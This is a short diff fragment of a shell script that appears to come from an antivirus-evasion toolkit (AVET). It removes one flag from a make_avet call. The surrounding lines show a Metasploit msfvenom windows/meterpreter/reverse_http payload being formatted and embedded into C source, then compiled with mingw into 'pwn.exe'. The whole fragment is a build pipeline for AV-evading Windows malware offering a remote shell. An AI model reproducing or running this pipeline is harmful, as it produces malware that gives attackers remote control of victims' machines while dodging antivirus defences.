@@ -9,6 +9,6 @@ msfvenom -p windows/meterpreter/reverse_http \
 #./format.sh sc.txt > scclean.txt && rm sc.txt
 #cat sc.txt >> defs.h
 #echo "" > scclean.txt
-./make_avet -f sc.txt -F -p
+./make_avet -f sc.txt -F
 i686-w64-mingw32-gcc -o pwn.exe avet.c
 rm sc.txt && echo "" > defs.h
